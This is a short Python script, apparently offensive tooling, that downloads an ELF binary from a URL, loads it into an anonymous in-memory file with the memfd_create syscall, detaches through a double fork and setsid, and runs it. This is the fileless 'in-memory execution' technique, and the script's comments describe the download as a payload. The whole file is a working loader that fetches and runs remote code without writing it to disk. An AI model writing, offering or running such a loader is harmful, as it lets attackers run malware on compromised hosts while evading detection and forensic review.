# use: ./linux_memfd.py <url to elf>

# largely based on: https://blog.fbkcs.ru/elf-in-memory-execution/

# only using standard libraries
import os
import ctypes
import sys
import pathlib
import urllib.request

# get syscall numbers
# these can be found in the Linux syscall tables
#   ex: 64 https://github.com/torvalds/linux/blob/v4.17/arch/x86/entry/syscalls/syscall_64.tbl
#       86 https://github.com/torvalds/linux/blob/v4.17/arch/x86/entry/syscalls/syscall_32.tbl
is64 = sys.maxsize > 2**32
mfd_no = 319 if is64 else 356  # memfd_create
ss_no = 112 if is64 else 66    # setsid

# set URL for payload here
url = sys.argv[1]

if __name__ == "__main__":
    # download payload into current process memory
    with urllib.request.urlopen(url, data=None, timeout=3) as r:
        elf = r.read()
    
    # create in-memory file
    shelf = ctypes.CDLL(None).syscall(mfd_no, "", 1)
    proc = f"/proc/self/fd/{shelf}"
    
    # write payload to in-memory file
    with open(proc, "wb") as f:
        f.write(elf)

    # following section dissociates the in-memory execution from current process
    # read more here: https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
    #   -> section: "Optional: fork(2)"
    child1 = os.fork()
    if child1 != 0:
        os._exit(0)
    ctypes.CDLL(None).syscall(ss_no)
    child2 = os.fork()
    if child2 != 0:
        os._exit(0)

    # execute in-memory file "out" of process
    os.execl(proc, "foo", "bar")
